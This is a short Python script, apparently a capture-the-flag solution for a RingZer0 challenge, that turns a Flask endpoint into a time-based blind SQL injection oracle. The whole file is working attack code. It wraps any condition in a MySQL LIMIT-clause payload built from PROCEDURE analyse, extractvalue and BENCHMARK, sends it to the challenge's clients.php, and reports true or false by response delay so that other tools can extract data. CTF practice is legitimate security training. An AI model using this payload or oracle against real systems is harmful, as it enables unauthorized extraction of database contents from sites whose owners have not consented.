#!/usr/bin/env python3

import requests
from flask import Flask, request
app = Flask(__name__)

BASE = "http://challenges.ringzer0team.com:10189/clients.php"

# http://www.edwardl.xyz/2015/02/06/SQL%20Injections%20in%20MySQL%20LIMIT%20clause/
PREFIX = "1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF("
SUFFIX = ", BENCHMARK(5000000,SHA1(1)),1))))),1)"

@app.route("/")
def hello_world():
    arg = request.args.get("arg")

    payload = {"max": PREFIX + arg + SUFFIX}
    resp = requests.get(BASE, params=payload)
    time = resp.elapsed.total_seconds()
    return "true" if time > 1.5 else "false"

if __name__ == "__main__":
    app.run()
